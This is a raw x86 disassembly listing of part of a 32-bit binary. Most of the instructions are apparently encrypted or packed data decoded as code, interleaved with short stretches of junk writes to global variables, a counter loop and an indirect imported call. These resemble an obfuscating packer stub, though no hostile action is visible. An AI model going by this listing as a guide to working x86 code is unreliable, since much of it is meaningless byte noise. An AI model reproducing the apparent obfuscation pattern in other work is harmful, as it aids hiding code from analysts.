  407ab3:	stos   DWORD PTR es:[edi],eax
  407ab4:	inc    eax
  407ab5:	fist   WORD PTR [ecx+0x71]
  407ab8:	xchg   cl,ch
  407aba:	(bad)  
  407abb:	mov    al,ds:0xd7eae9b2
  407ac0:	adc    al,0x34
  407ac2:	inc    ebx
  407ac3:	xor    ah,BYTE PTR [eax-0x55]
  407ac6:	adc    ecx,DWORD PTR [edx-0x60f2cb3c]
  407acc:	xchg   ebx,eax
  407acd:	mov    BYTE PTR [ebx-0x67a77b87],bl
  407ad3:	mov    edx,0x546bb25b
  407ad8:	js     0x407ab0
  407ada:	jae    0x407b0f
  407adc:	jp     0x407aba
  407ade:	add    al,0x1f
  407ae0:	pop    DWORD PTR [ebx]
  407ae2:	imul   ebp,DWORD PTR [ebx+0x48ee1522],0xc21fd395
  407aec:	mov    ebp,0xb3b98a1a
  407af1:	pop    edi
  407af2:	dec    eax
  407af3:	scas   al,BYTE PTR es:[edi]
  407af4:	mov    WORD PTR [esi+0x7736d19c],cs
  407afa:	gs add al,0xfc
  407afd:	(bad)  
  407afe:	es loop 0x407b58
  407b01:	push   ss
  407b02:	or     eax,0xcdab9be6
  407b07:	push   eax
  407b08:	es xchg bh,al
  407b0b:	in     al,0x96
  407b0d:	repnz and dl,BYTE PTR [ebx+0x32]
  407b11:	std    
  407b12:	sahf   
  407b13:	sub    BYTE PTR [ecx-0x209e9c8],cl
  407b19:	scas   eax,DWORD PTR es:[edi]
  407b1a:	mov    dh,0x50
  407b1c:	mov    WORD PTR [edi-0x77],es
  407b1f:	jae    0x407b33
  407b21:	sub    bh,BYTE PTR [ecx+0x2e538afe]
  407b27:	(bad)  
  407b28:	daa    
  407b29:	mov    bl,0x59
  407b2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b2c:	add    DWORD PTR [ecx+0x3b],esi
  407b2f:	enter  0x850f,0xc6
  407b33:	add    eax,DWORD PTR [eax]
  407b35:	add    BYTE PTR [esi-0x75],ah
  407b38:	inc    ebp
  407b39:	clc    
  407b3a:	xor    ecx,0x551
  407b40:	mov    ecx,0x8a3c
  407b45:	sub    DWORD PTR ds:0x433623,0x433667
  407b4f:	xor    ax,cx
  407b52:	mov    ecx,0x3b02
  407b57:	sub    DWORD PTR ds:0x433703,0x1193
  407b61:	add    ax,cx
  407b64:	mov    ecx,DWORD PTR [ebp+0x8]
  407b67:	movzx  eax,ax
  407b6a:	and    DWORD PTR ds:0x43362b,0x433727
  407b74:	not    eax
  407b76:	and    eax,DWORD PTR [ecx]
  407b78:	mov    DWORD PTR ds:0x43373b,0x844
  407b82:	mov    ecx,DWORD PTR [ebp+0x8]
  407b85:	mov    DWORD PTR ds:0x4336fb,0x1c5f
  407b8f:	mov    DWORD PTR [ecx],eax
  407b91:	jmp    0x407ee8
  407b96:	jmp    0x407ee1
  407b9b:	dec    eax
  407b9c:	sbb    dh,BYTE PTR [ebx-0x16]
  407b9f:	jno    0x407c14
  407ba1:	push   ecx
  407ba2:	cwde   
  407ba3:	mov    ds:0xfff6a3a4,al
  407ba8:	jl     0x407bd6
  407baa:	add    DWORD PTR [eax-0x35],edi
  407bad:	jle    0x407c2d
  407baf:	and    BYTE PTR [ebp+0x7e],bh
  407bb2:	jle    0x407b98
  407bb4:	mov    ecx,0x96a6c70f
  407bb9:	cdq    
  407bba:	mov    ah,BYTE PTR [edx+0x7f4b3dca]
  407bc0:	sbb    al,0xa4
  407bc2:	fldenv [ebp+edi*8-0x6b]
  407bc6:	lods   al,BYTE PTR ds:[esi]
  407bc7:	nop
  407bc8:	xchg   cl,bh
  407bca:	add    dh,ah
  407bcc:	sub    BYTE PTR [esi+0x48],0x96
  407bd0:	inc    ebx
  407bd1:	or     eax,0xa63bb4e7
  407bd6:	xchg   DWORD PTR [eax-0x11],eax
  407bd9:	(bad)  
  407bda:	mov    dl,0xac
  407bdc:	leave  
  407bdd:	lock jmp 0x2976:0xd8e65f49
  407be5:	outs   dx,DWORD PTR ds:[esi]
  407be6:	ficomp WORD PTR [ebx+ecx*8-0x4ecb4b36]
  407bed:	ret    
  407bee:	cwde   
  407bef:	fbstp  TBYTE PTR [eax-0x72]
  407bf2:	and    BYTE PTR [edx-0x6c4be9c1],cl
  407bf8:	inc    esi
  407bf9:	retf   
  407bfa:	mov    ch,BYTE PTR [ecx]
  407bfc:	xchg   edi,eax
  407bfd:	jl     0x407c21
  407bff:	pop    esi
  407c00:	mov    BYTE PTR [edi+0x1498fd81],0xbd
  407c07:	pop    ebp
  407c08:	jecxz  0x407b98
  407c0a:	mov    ebp,0xf897c421
  407c0f:	add    eax,0x4f5f624c
  407c14:	cld    
  407c15:	imul   ch
  407c17:	cld    
  407c18:	daa    
  407c19:	jae    0x407baf
  407c1b:	mov    cl,0x3a
  407c1d:	push   esi
  407c1e:	aam    0xfd
  407c20:	sbb    DWORD PTR [ebp+0x51],esp
  407c23:	sub    eax,0x6ce244ee
  407c28:	clc    
  407c29:	dec    DWORD PTR [ebp+0x7e]
  407c2c:	fs sbb bl,bl
  407c2f:	mov    ebx,0x198dc4d
  407c34:	mov    cs,WORD PTR [edx]
  407c36:	inc    esi
  407c37:	xor    bl,ch
  407c39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c3a:	push   ecx
  407c3b:	mov    DWORD PTR [esi-0x42],ecx
  407c3e:	jae    0x407c44
  407c40:	xor    BYTE PTR [edi-0x1f7c6575],bl
  407c46:	cmp    bl,al
  407c48:	pop    ecx
  407c49:	cdq    
  407c4a:	retf   0xc935
  407c4d:	lea    esp,[edi+0x2fd809c3]
  407c53:	push   eax
  407c54:	push   ss
  407c55:	dec    esp
  407c56:	ins    DWORD PTR es:[edi],dx
  407c57:	xor    ecx,edi
  407c59:	xlat   BYTE PTR ds:[ebx]
  407c5a:	push   ss
  407c5b:	dec    edi
  407c5c:	pop    ds
  407c5d:	pop    esp
  407c5e:	mov    ebx,0x7803a8e4
  407c63:	rcl    BYTE PTR [ecx-0x11f73972],0x74
  407c6a:	es jmp 0x407c83
  407c6d:	dec    ebp
  407c6e:	inc    esi
  407c6f:	sbb    al,0xff
  407c71:	push   esp
  407c72:	out    dx,al
  407c73:	popf   
  407c74:	sahf   
  407c75:	outs   dx,DWORD PTR ds:[esi]
  407c76:	shl    BYTE PTR [ebx+0x13c9cbfc],cl
  407c7c:	mov    ah,0xdc
  407c7e:	fisttp DWORD PTR [esi+0x43]
  407c81:	inc    ecx
  407c82:	(bad)  
  407c84:	inc    eax
  407c85:	xchg   esp,eax
  407c86:	cmp    dl,BYTE PTR [edi]
  407c88:	sub    ah,ch
  407c8a:	rcl    DWORD PTR [edx-0xffc7cab],0x2
  407c91:	cs dec eax
  407c93:	mov    ds:0xa4088f33,al
  407c98:	pushf  
  407c99:	cmp    al,0x30
  407c9b:	mov    BYTE PTR [eax+0x1e],0x1e
  407c9f:	jge    0x407c8e
  407ca1:	adc    BYTE PTR [esi-0x11d31f1c],dh
  407ca7:	ja     0x407d21
  407ca9:	std    
  407caa:	jnp    0x407c90
  407cac:	sub    eax,0xdcaf3e8b
  407cb1:	(bad)  
  407cb3:	stos   DWORD PTR es:[edi],eax
  407cb4:	call   0xbcbe:0x3834af8a
  407cbb:	mov    BYTE PTR [esi],0x17
  407cbe:	lea    eax,[esi+0x77]
  407cc1:	int3   
  407cc2:	sbb    bh,bh
  407cc4:	addr16 pop ebx
  407cc6:	jg     0x407c83
  407cc8:	arpl   WORD PTR ss:[eax-0x5e],si
  407ccc:	mov    dh,0x4c
  407cce:	sub    edi,DWORD PTR [eax]
  407cd0:	adc    eax,0x6b55beac
  407cd5:	mov    bl,0x76
  407cd7:	push   0x403ea2d3
  407cdc:	jnp    0x407d1b
  407cde:	pop    esp
  407cdf:	pop    esi
  407ce0:	push   cs
  407ce1:	xchg   ebp,eax
  407ce2:	and    al,0xa9
  407ce4:	jge    0x407c6d
  407ce6:	repnz daa 
  407ce8:	shl    BYTE PTR [esi-0x2f4950d6],0x7b
  407cef:	or     ecx,esp
  407cf1:	cmp    DWORD PTR [ecx-0x6c],0xf24a69e2
  407cf8:	fdivr  DWORD PTR [edx-0x1ac7c174]
  407cfe:	mov    al,BYTE PTR [edi]
  407d00:	fisttp DWORD PTR [edi+0x34e66721]
  407d06:	cdq    
  407d07:	jmp    0xa09e:0xf337a3e5
  407d0e:	lahf   
  407d0f:	loop   0x407cf2
  407d11:	out    dx,al
  407d12:	xchg   edi,eax
  407d13:	jb     0x407d3a
  407d15:	in     eax,dx
  407d16:	or     eax,0x5f7aa79f
  407d1b:	mov    eax,ds:0xbc55f120
  407d20:	mov    edi,0xcbcee293
  407d25:	mov    al,0x8c
  407d27:	test   BYTE PTR [ebp*8-0x129a3bb6],bl
  407d2e:	shl    dl,1
  407d30:	push   cs
  407d31:	or     esi,DWORD PTR [ecx+0x7e]
  407d34:	mov    ebp,DWORD PTR [ebp-0x2978c69e]
  407d3a:	out    dx,eax
  407d3b:	clc    
  407d3c:	xchg   ebx,eax
  407d3d:	jae    0x407db1
  407d3f:	jmp    0x8c02:0x1b1ccdec
  407d46:	inc    esi
  407d47:	and    eax,0xd85efcb6
  407d4c:	sbb    ebx,DWORD PTR [edi]
  407d4e:	jo     0x407ceb
  407d50:	or     DWORD PTR [eax+0x58],ecx
  407d53:	cmc    
  407d54:	inc    ecx
  407d55:	ror    DWORD PTR [eax-0x2d04cd39],cl
  407d5b:	mov    esi,gs
  407d5d:	xor    BYTE PTR ds:0xa3b7627a,cl
  407d63:	aam    0x40
  407d65:	mov    bh,0xc3
  407d67:	push   esi
  407d68:	stc    
  407d69:	popa   
  407d6a:	daa    
  407d6b:	dec    esp
  407d6c:	push   eax
  407d6d:	dec    ecx
  407d6e:	rol    BYTE PTR [eax],0xb5
  407d71:	adc    bl,ah
  407d73:	ja     0x407d9c
  407d75:	push   0xffffffbf
  407d77:	int3   
  407d78:	xor    DWORD PTR ds:0xb8e38e80,ecx
  407d7e:	inc    ebp
  407d7f:	push   es
  407d80:	jmp    0x905c64f5
  407d85:	xchg   esp,eax
  407d86:	sub    ah,BYTE PTR gs:[edi]
  407d89:	push   ebp
  407d8a:	xor    al,0xad
  407d8c:	std    
  407d8d:	sbb    ch,BYTE PTR ds:0xab07971c
  407d93:	fdivr  DWORD PTR [ebx+0x79]
  407d96:	or     dh,BYTE PTR [ebx+esi*2+0x38599727]
  407d9d:	clc    
  407d9e:	mov    ds:0x2a1ac805,al
  407da3:	je     0x407dec
  407da5:	stos   DWORD PTR es:[edi],eax
  407da6:	js     0x407d50
  407da8:	sub    al,0x84
  407daa:	pop    ecx
  407dab:	shl    BYTE PTR [edx+0x6b236ff6],0xaf
  407db2:	xor    al,BYTE PTR [ebp-0x1034307]
  407db8:	push   0xfffffff9
  407dba:	dec    esp
  407dbb:	aas    
  407dbc:	out    dx,al
  407dbd:	scas   eax,DWORD PTR es:[edi]
  407dbe:	call   0x12c1:0x222ff58e
  407dc5:	xor    eax,0x5a6e0d79
  407dca:	outs   dx,DWORD PTR ds:[esi]
  407dcb:	push   eax
  407dcc:	jno    0x407d94
  407dce:	pop    esi
  407dcf:	jecxz  0x407e39
  407dd1:	scas   al,BYTE PTR es:[edi]
  407dd2:	hlt    
  407dd3:	cpuid  
  407dd5:	int3   
  407dd6:	jmp    0x407d66
  407dd8:	add    bl,ch
  407dda:	adc    al,0x21
  407ddc:	or     eax,0xaf057b5b
  407de1:	dec    eax
  407de2:	jnp    0x407df4
  407de4:	fsubr  QWORD PTR [ecx]
  407de6:	sbb    dh,BYTE PTR [ebx]
  407de8:	fst    DWORD PTR [ecx+0x7b]
  407deb:	cli    
  407dec:	mov    ecx,DWORD PTR [esi]
  407dee:	fs sub al,0x1b
  407df1:	jmp    0x407de9
  407df3:	add    eax,0x151e7f3f
  407df8:	int3   
  407df9:	or     BYTE PTR [edi-0x63],dh
  407dfc:	cmp    al,0x55
  407dfe:	sar    DWORD PTR [eax],0x42
  407e01:	pop    ecx
  407e02:	add    ecx,DWORD PTR [ecx-0x31c70800]
  407e08:	mov    dh,0x7d
  407e0a:	int3   
  407e0b:	add    al,0x7a
  407e0d:	iret   
  407e0e:	nop
  407e0f:	popf   
  407e10:	cmp    al,0xa5
  407e12:	retf   0x1f17
  407e15:	iret   
  407e16:	cmp    eax,0xfe738ce1
  407e1b:	mov    DWORD PTR [ebx],0x13cb2429
  407e21:	loope  0x407dc3
  407e23:	fcom   DWORD PTR [esi-0x3c0299cd]
  407e29:	popf   
  407e2a:	cdq    
  407e2b:	and    ebx,DWORD PTR [eax]
  407e2d:	imul   eax,DWORD PTR [esi+0x17],0xffffffe3
  407e31:	fs hlt 
  407e33:	inc    esp
  407e34:	(bad)  
  407e35:	aas    
  407e36:	dec    ebp
  407e37:	and    al,0xca
  407e39:	or     ebp,DWORD PTR [edx-0x3]
  407e3c:	cs sub cl,ah
  407e3f:	call   FWORD PTR [esp+edi*8+0x13]
  407e43:	pop    es
  407e44:	into   
  407e45:	nop
  407e46:	outs   dx,BYTE PTR ds:[esi]
  407e47:	outs   dx,DWORD PTR ds:[esi]
  407e48:	ja     0x407e33
  407e4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e4b:	icebp  
  407e4c:	fsub   DWORD PTR [ebx+0x1ef5a371]
  407e52:	xor    BYTE PTR [eax],al
  407e54:	loop   0x407e8d
  407e56:	addr16 dec edx
  407e58:	xlat   BYTE PTR ds:[ebx]
  407e59:	jns    0x407df6
  407e5b:	mov    ebp,0x70096096
  407e60:	call   0xd936:0xabe7a3a9
  407e67:	xlat   BYTE PTR ds:[ebx]
  407e68:	idiv   DWORD PTR [ecx-0x6f744a8a]
  407e6e:	pop    edi
  407e6f:	rcr    BYTE PTR [ebx+0xecbc0f9],1
  407e75:	or     BYTE PTR ds:0x73680bfd,dh
  407e7b:	add    esi,DWORD PTR [ebp+0xafe2e85]
  407e81:	ret    0xb4b5
  407e84:	fsub   DWORD PTR [edx-0x2b]
  407e87:	in     eax,dx
  407e88:	xlat   BYTE PTR ds:[ebx]
  407e89:	daa    
  407e8a:	jecxz  0x407e0d
  407e8c:	xchg   ebx,eax
  407e8d:	xchg   ecx,eax
  407e8e:	and    DWORD PTR [eax],edx
  407e90:	mov    ebx,0xb6b19fbc
  407e95:	mov    esp,0xd8eb8c4d
  407e9a:	enter  0x5905,0xdb
  407e9e:	dec    esp
  407e9f:	out    0xb8,eax
  407ea1:	mov    eax,0xfeba9973
  407ea6:	call   0x4c35:0xe0910c43
  407ead:	(bad)  
  407eae:	pop    eax
  407eaf:	cmp    al,0xfb
  407eb1:	xor    eax,0xacf85cc6
  407eb6:	inc    ebx
  407eb7:	xlat   BYTE PTR ds:[ebx]
  407eb8:	mov    al,BYTE PTR [ebx-0x64ff507]
  407ebe:	cdq    
  407ebf:	test   al,0x5f
  407ec1:	push   esp
  407ec2:	add    eax,0xbaf481f6
  407ec7:	clc    
  407ec8:	cmp    DWORD PTR [edx-0x2def085b],edx
  407ece:	mov    DWORD PTR [ebp-0x3c],ebx
  407ed1:	ds mov ax,0xdf72
  407ed6:	enter  0xeb3b,0xdf
  407eda:	std    
  407edb:	adc    esp,DWORD PTR [ebp+0x71]
  407ede:	aaa    
  407edf:	aaa    
  407ee0:	fiadd  DWORD PTR [ecx-0x6147038b]
  407ee6:	adc    al,0xe
  407ee8:	mov    ax,WORD PTR [ebp-0x8]
  407eec:	push   DWORD PTR [ebp+0x8]
  407eef:	call   0x407f00
  407ef4:	test   eax,eax
  407ef6:	je     0x407ee1
  407efc:	leave  
  407efd:	ret    0x4
  407f00:	push   ebp
  407f01:	mov    ebp,esp
  407f03:	sub    esp,0x2c
  407f06:	or     DWORD PTR ds:0x43366f,edi
  407f0c:	jmp    0x408093
  407f11:	outs   dx,DWORD PTR ds:[esi]
  407f12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f13:	ins    BYTE PTR es:[edi],dx
  407f14:	inc    edi
  407f15:	jne    0x407f6c
  407f17:	jne    0x407ecf
  407f19:	push   ss
  407f1a:	push   ds
  407f1b:	mov    ch,0xcc
  407f1d:	int    0x87
  407f1f:	inc    ebp
  407f20:	out    0x2a,eax
  407f22:	(bad)  
  407f23:	jle    0x407fa3
  407f25:	in     al,0x7f
  407f27:	jle    0x407fa7
  407f29:	ror    DWORD PTR [esi+0x23],cl
  407f2c:	rep outs dx,DWORD PTR ds:[esi]
  407f2e:	rol    BYTE PTR [eax+edx*2],0x72
  407f32:	push   ebx
  407f33:	and    DWORD PTR [edi+0x3e],ebx
  407f36:	xor    DWORD PTR [edx-0x72cdb34],ebx
  407f3c:	adc    BYTE PTR [edi-0x6d440511],dh
  407f42:	icebp  
  407f43:	(bad)  
  407f44:	mov    al,ds:0xd746046e
  407f49:	das    
  407f4a:	arpl   WORD PTR [ecx+0x1f7e92c8],cx
  407f50:	cld    
  407f51:	aaa    
  407f52:	adc    DWORD PTR [edx+esi*2+0x3a],esp
  407f56:	jbe    0x407eef
  407f58:	and    eax,DWORD PTR [esi-0x2d]
  407f5b:	rcr    DWORD PTR [ebp+ecx*1+0x68],1
  407f5f:	mov    ecx,0x4aacf2a3
  407f64:	jb     0x407f0d
  407f66:	xchg   ecx,eax
  407f67:	mov    WORD PTR [eax+0x16f22222],dx
  407f6e:	push   ebx
  407f6f:	mul    DWORD PTR ds:0xef0ab298
  407f75:	sub    dh,BYTE PTR ss:[edi]
  407f78:	inc    ebx
  407f79:	dec    ebx
  407f7a:	adc    bh,bl
  407f7c:	adc    al,0x33
  407f7e:	adc    cl,bh
  407f80:	pop    ecx
  407f81:	push   0x7bace987
  407f86:	pop    es
  407f87:	inc    ebp
  407f88:	jo     0x407f76
  407f8a:	ror    BYTE PTR [eax-0x849ecd3],1
  407f90:	dec    edx
  407f91:	mov    eax,ds:0x61d995e8
  407f96:	xlat   BYTE PTR ds:[ebx]
  407f97:	adc    edi,DWORD PTR [edx+0x16]
  407f9a:	pop    esi
  407f9b:	ins    DWORD PTR es:[edi],dx
  407f9c:	mov    ch,0xa6
  407f9e:	pop    edx
  407f9f:	call   0xc388eb07
  407fa4:	fild   WORD PTR [ecx-0x16]
  407fa7:	mov    cl,0x95
  407fa9:	sub    eax,0x84ddbce5
  407fae:	loope  0x407f39
  407fb0:	dec    eax
  407fb1:	imul   ebx,DWORD PTR [ebx-0x7640560c],0xffffffed
  407fb8:	in     al,0x7d
  407fba:	xchg   edx,eax
  407fbb:	clc    
  407fbc:	cmc    
  407fbd:	rcl    BYTE PTR [edx],cl
  407fbf:	push   ss
  407fc0:	sbb    ah,BYTE PTR ds:0xac6634c2
  407fc6:	(bad)
  407fca:	int    0xa6
  407fcc:	inc    BYTE PTR [ebx-0x15]
  407fcf:	push   ebx
  407fd0:	mov    esi,0x39c41071
  407fd5:	sub    BYTE PTR [eax+0x63],0x60
  407fd9:	test   DWORD PTR [ebx],0x4e76e4fc
  407fdf:	push   ecx
  407fe0:	scas   al,BYTE PTR es:[edi]
  407fe1:	addr16 jmp 0x1342638b
  407fe7:	out    dx,al
  407fe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fe9:	jle    0x408048
  407feb:	inc    ecx
  407fec:	xchg   ebp,eax
  407fed:	aam    0x9b
  407fef:	pop    esp
  407ff0:	fnstenv [ebp+0x23d11b64]
  407ff6:	sub    ecx,DWORD PTR [ebx-0x1e]
  407ff9:	jo     0x408057
  407ffb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ffc:	adc    esp,DWORD PTR [edx-0x21]
  407fff:	jnp    0x407fc8
  408001:	popf   
  408002:	jg     0x408059
  408004:	fld    QWORD PTR [eax-0x51]
  408007:	jecxz  0x408011
  408009:	push   es
  40800a:	aaa    
  40800b:	xchg   ebp,eax
  40800c:	mov    ebx,0xb39ffabf
  408011:	sbb    BYTE PTR es:[di-0x39],ch
  408016:	test   eax,0x9f4878c0
  40801b:	loope  0x408018
  40801d:	pop    es
  40801e:	pop    eax
  40801f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408020:	test   eax,0x73bc7886
  408025:	(bad)  
  408026:	in     al,dx
  408027:	test   eax,0x7eda6737
  40802c:	int    0xff
  40802e:	stos   BYTE PTR es:[edi],al
  40802f:	cmp    cl,BYTE PTR [eax]
  408031:	adc    DWORD PTR [esp+edx*1-0x18],esp
  408035:	add    eax,0x88499ea9
  40803a:	test   DWORD PTR [ebx+0x14],0x37b86beb
  408041:	int3   
  408042:	dec    eax
  408043:	jecxz  0x408000
  408045:	adc    esi,ebp
  408047:	xchg   esp,eax
  408048:	cdq    
  408049:	nop
  40804a:	jl     0x4080b6
  40804c:	shl    BYTE PTR [edi+0x5a],0xdc
  408050:	pop    esi
  408051:	addr16 addr16 mov eax,0xdbc2a497
  408058:	xchg   ecx,eax
  408059:	sahf   
  40805a:	adc    al,0x12
  40805c:	das    
  40805d:	push   es
  40805e:	stos   DWORD PTR es:[edi],eax
  40805f:	pop    ss
  408060:	pusha  
  408061:	pusha  
  408062:	mov    dl,0xdd
  408064:	xor    al,0xd9
  408066:	adc    DWORD PTR [ebp+eiz*1+0x3dfeed89],ebx
  40806d:	add    eax,0xb6f145e3
  408072:	inc    ecx
  408073:	or     eax,0x33fea80c
  408078:	test   BYTE PTR [edi+0x51971ae9],cl
  40807e:	jne    0x4080c7
  408080:	xor    BYTE PTR [esi-0x2a],ch
  408083:	int    0xca
  408085:	or     al,BYTE PTR [edx-0x245756bd]
  40808b:	mov    dh,0xef
  40808d:	push   edx
  40808e:	imul   ecx,DWORD PTR [eax],0x5
  408091:	into   
  408092:	cmp    edi,eax
  408094:	inc    ebp
  408095:	clc    
  408096:	xor    al,BYTE PTR [ebp-0x38be0764]
  40809c:	inc    ebp
  40809d:	in     al,dx
  40809e:	xor    DWORD PTR [ebp+0x77b8f89c],eax
  4080a4:	xchg   ebp,eax
  4080a5:	add    BYTE PTR [eax],al
  4080a7:	mov    ecx,DWORD PTR ds:0x433627
  4080ad:	xor    DWORD PTR ds:0x433733,ecx
  4080b3:	mov    WORD PTR [ebp-0x4],ax
  4080b7:	inc    DWORD PTR ds:0x433737
  4080bd:	lea    eax,[ebp-0x24]
  4080c0:	mov    DWORD PTR [ebp-0x28],eax
  4080c3:	sbb    ecx,0x45b9
  4080c9:	mov    eax,DWORD PTR [ebp+0x8]
  4080cc:	mov    DWORD PTR [ebp-0x20],eax
  4080cf:	push   ebx
  4080d0:	movzx  ecx,WORD PTR ds:0x4336fb
  4080d7:	add    ecx,DWORD PTR ds:0x43361b
  4080dd:	mov    DWORD PTR ds:0x4336fb,ecx
  4080e3:	lea    eax,[ebp-0x18]
  4080e6:	mov    DWORD PTR [ebp-0x1c],eax
  4080e9:	mov    eax,DWORD PTR [ebp-0x1c]
  4080ec:	and    DWORD PTR ds:0x433667,edx
  4080f2:	push   esi
  4080f3:	or     DWORD PTR ds:0x433683,ebx
  4080f9:	push   edi
  4080fa:	add    DWORD PTR ds:0x43361f,ebx
  408100:	mov    edi,0xf89f2da9
  408105:	mov    DWORD PTR [eax],edi
  408107:	and    DWORD PTR ds:0x4336b3,0x0
  408111:	jmp    0x408121
  408116:	mov    eax,ds:0x4336b3
  40811b:	inc    eax
  40811c:	mov    ds:0x4336b3,eax
  408121:	cmp    DWORD PTR ds:0x4336b3,0x11
  408128:	jae    0x408163
  40812e:	cmp    DWORD PTR ds:0x4336b3,0x4
  408135:	jne    0x408146
  40813b:	push   0x1543
  408140:	call   DWORD PTR ds:0x412390
  408146:	cmp    DWORD PTR ds:0x4336b3,0x3
  40814d:	jne    0x40815e
  408153:	mov    eax,ds:0x4336b3
  408158:	inc    eax
  408159:	mov    ds:0x4336b3,eax
  40815e:	jmp    0x408116
  408163:	mov    eax,DWORD PTR [ebp-0x14]
  408166:	mov    ebx,DWORD PTR [ebp-0x8]
  408169:	mov    ecx,0x7510854
  40816e:	mov    DWORD PTR ds:0x43366b,0x500e
  408178:	jmp    0x4082ff
  40817d:	xor    dl,BYTE PTR [esi+0x23]
  408180:	inc    edi
  408181:	arpl   WORD PTR [ebx+0x72],si
  408184:	jae    0x408123
  408186:	aas    
  408187:	or     eax,0x1991f18b
  40818c:	dec    esp
  40818d:	nop
  40818e:	xlat   BYTE PTR ds:[ebx]
  40818f:	jle    0x40820f
  408191:	in     al,0x7f
  408193:	jle    0x408213
  408195:	pop    ds
  408196:	adc    edi,DWORD PTR [ecx+0x323f5b59]
  40819c:	xchg   esp,eax
  40819d:	mov    edi,0x701aaade
  4081a2:	ror    BYTE PTR ds:0x22b20e88,1
  4081a8:	lahf   
  4081a9:	mov    al,0x17
  4081ab:	ret    
  4081ac:	ss into 
  4081ae:	cs pop eax
  4081b0:	cmp    al,0xde
  4081b2:	xor    edx,ecx
  4081b4:	mov    ebx,0xb239ab2c
  4081b9:	popf   
  4081ba:	xor    dh,bh
  4081bc:	ror    BYTE PTR gs:[esi+0x15],cl
  4081c0:	sbb    ebp,DWORD PTR [edi-0xeff118f]
  4081c6:	leave  
  4081c7:	pop    ss
  4081c8:	adc    esp,ebx
  4081ca:	int    0xf
  4081cc:	and    BYTE PTR [ecx-0x5f760814],ch
  4081d2:	mov    dl,0xb3
  4081d4:	jbe    0x40816d
  4081d6:	jmp    0x36ee:0xa4204673
  4081dd:	int    0x39
  4081df:	out    0xcc,eax
  4081e1:	dec    ecx
  4081e2:	or     DWORD PTR [eax-0x21],esp
  4081e5:	xor    BYTE PTR [esp+edx*2+0x7b22913a],0x63
  4081ed:	je     0x408195
  4081ef:	push   esp
  4081f0:	mov    ebp,ecx
  4081f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081f3:	dec    ecx
  4081f4:	sub    eax,0xce24e86b
  4081f9:	test   DWORD PTR [ecx+0xea2e6bf],ebp
  4081ff:	nop
  408200:	lea    ecx,ds:0xd99f7fcb
  408206:	pop    edx
  408207:	dec    eax
  408208:	ficom  WORD PTR [edx]
  40820a:	hlt    
  40820b:	mov    dh,0x5e
  40820d:	mov    al,0x0
  40820f:	outs   dx,DWORD PTR ds:[esi]
  408210:	sti    
  408211:	adc    dl,BYTE PTR [edx+0xf]
  408214:	pop    eax
  408215:	outs   dx,BYTE PTR ds:[esi]
  408216:	mov    dh,0x11
  408218:	retf   
  408219:	rol    BYTE PTR ds:0xe6971aaf,1
  40821f:	out    dx,al
  408220:	add    edx,DWORD PTR [edi+esi*2-0x5c]
  408224:	sbb    al,0x6f
  408226:	lea    ebx,[ebp-0x163d899a]
  40822c:	mov    edx,0x4f11e7d8
  408231:	mov    BYTE PTR [ebx+esi*2+0x39],bh
  408235:	cmp    BYTE PTR [edx+0x38],bh
  408238:	dec    esp
  408239:	pusha  
  40823a:	xchg   edx,eax
  40823b:	add    eax,0x46d42df6
  408240:	dec    ebp
  408241:	in     eax,0xdf
  408243:	cmp    eax,0x18aed76c
  408248:	or     bl,BYTE PTR [edi]
  40824a:	mov    esp,0x5d5c895f
  40824f:	cmp    eax,0xe215b71
  408254:	mov    ?,WORD PTR [ebp-0x79]
  408257:	xchg   ch,cl
  408259:	pushf  
  40825a:	pop    edx
  40825b:	mov    eax,0xdc7029d
  408260:	sbb    eax,0x6eb8dbfd
  408265:	idiv   BYTE PTR [ebp-0x2d92ae80]
  40826b:	mov    ah,0x59
  40826d:	adc    al,0xe0
  40826f:	adc    eax,0xacce86d8
  408274:	sar    BYTE PTR [edx+0x13c3ad6b],0xcd
  40827b:	sub    ah,BYTE PTR [edi+edx*1]
  40827e:	(bad)  
  40827f:	(bad)  [edi+ebx*1]
  408282:	adc    DWORD PTR [ecx+0x4c],ebx
  408285:	mov    ah,0x1e
  408287:	push   ebx
  408288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408289:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40828a:	dec    ebx
  40828b:	ret    
  40828c:	sar    dl,1
  40828e:	and    ecx,DWORD PTR ds:0xc750686a
  408294:	iret   
  408295:	mov    BYTE PTR [esp+ebp*2+0xc],bl
  408299:	aas    
  40829a:	dec    edi
  40829b:	outs   dx,BYTE PTR ds:[esi]
  40829c:	int    0x67
  40829e:	jae    0x4082ee
  4082a0:	mov    WORD PTR [edi+0x63],ss
  4082a3:	das    
  4082a4:	sbb    DWORD PTR [edi+0x60],eax
  4082a7:	pop    eax
  4082a8:	xor    DWORD PTR [esi],edi
  4082aa:	push   ds
  4082ab:	fs push cs
  4082ad:	add    eax,0x8ab1b50a
  4082b2:	mov    bl,0xc0
  4082b4:	ins    BYTE PTR es:[edi],dx
  4082b5:	push   ebp
  4082b6:	inc    edi
  4082b7:	stos   DWORD PTR es:[edi],eax
  4082b8:	in     al,0x4
  4082ba:	sbb    BYTE PTR [edx+0x38],al
  4082bd:	repz dec ebx
  4082bf:	cdq    
  4082c0:	sti    
  4082c1:	popa   
  4082c2:	or     edx,DWORD PTR [edi+ebx*1+0x5]
  4082c6:	int    0x51
  4082c8:	mov    edx,0x14800144
  4082cd:	inc    edx
  4082ce:	(bad)  
  4082cf:	retf   0xa04b
  4082d2:	pop    esp
  4082d3:	cmp    DWORD PTR [edx+eiz*8],0x6e
  4082d7:	sbb    DWORD PTR [ebp-0x42fb521e],edx
  4082dd:	mov    ds:0x255331bc,eax
  4082e2:	jb     0x4082dc
  4082e4:	es sbb eax,0x5ae99881
  4082ea:	shl    BYTE PTR [eax+0x14],0xf8
  4082ee:	push   0x6faf6820
  4082f3:	dec    esp
  4082f4:	mov    dh,0xd3
  4082f6:	push   0x53b7c5bd
  4082fb:	(bad)  
  4082fc:	sahf   
  4082fd:	jg     0x408305
  4082ff:	xor    eax,ecx
  408301:	and    DWORD PTR ds:0x43367f,0x1370
